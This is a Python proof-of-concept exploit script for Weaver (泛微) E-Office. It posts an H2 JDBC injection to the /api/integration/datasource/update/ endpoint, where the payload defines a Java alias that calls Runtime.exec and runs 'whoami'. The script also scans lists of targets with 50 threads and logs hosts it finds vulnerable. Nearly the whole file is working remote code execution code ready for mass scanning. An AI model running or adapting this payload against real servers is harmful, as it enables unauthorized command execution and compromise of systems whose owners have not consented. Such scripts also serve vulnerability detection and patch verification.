import argparse, requests, sys, re
from multiprocessing.dummy import Pool

def banner():
    test = """
 ___  ____  ___  ___   ___   ___    __  
/ __)(_  _)/ __)(__ \ | __) / _ \  /. | 
\__ \ _)(_ \__ \ / _/ |__ \( (_) )(_  _)
(___/(____)(___/(____)(___/ \___/   (_) 
  泛微 E-Office /api/integration/datasource/update/ RCE检测
"""
    print(test)

def poc(target):
    if not target.startswith("http"):
        target = "http://" + target

    url = target.rstrip("/") + "/api/integration/datasource/update/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    # payload 执行 whoami
    data = (
        "pointid=aaa&type=sqlserver2025&iscluster=2&username=333&port=1&dbname=aaaa&password=11"
        "&usepool=1&minconn=5&maxconn=10&sortid=1&id=1&operate=test&host=abc&"
        "url=jdbc:h2:mem:test;MODE=MSSQLSERVER;"
        "INIT=CREATE ALIAS EXEC AS $$ String exec(String cmd) throws java.lang.Exception "
        "{ java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream(); "
        "java.util.Scanner s = new java.util.Scanner(in).useDelimiter(\"\\\\A\"); return s.hasNext()?s.next():\"\"; } $$;"
        "CALL EXEC('whoami');"
    )

    try:
        res = requests.post(url=url, headers=headers, data=data, timeout=8, verify=False)
        if res.status_code == 200 and re.search(r"[a-z0-9\\\-]+", res.text, re.I):
            print(f"[+] {target} 可能存在RCE漏洞 -> 返回: {res.text.strip()[:50]}")
            with open("result2.txt", "a", encoding="utf-8") as fp:
                fp.write(target + "\n")
        else:
            print(f"[-] {target} 不存在漏洞")
    except:
        pass

def main():
    banner()
    parser = argparse.ArgumentParser(description="泛微 E-Office /api/integration/datasource/update/ RCE检测")
    parser.add_argument('-u', '--url', dest='url', type=str, help="单个目标 URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help="目标列表文件")
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r', encoding='utf-8') as f:
            urls = [i.strip() for i in f if i.strip()]
        mp = Pool(50)
        mp.map(poc, urls)
        mp.close()
        mp.join()
    else:
        print(f"usage: python3 {sys.argv[0]} -h")

if __name__ == "__main__":
    main()
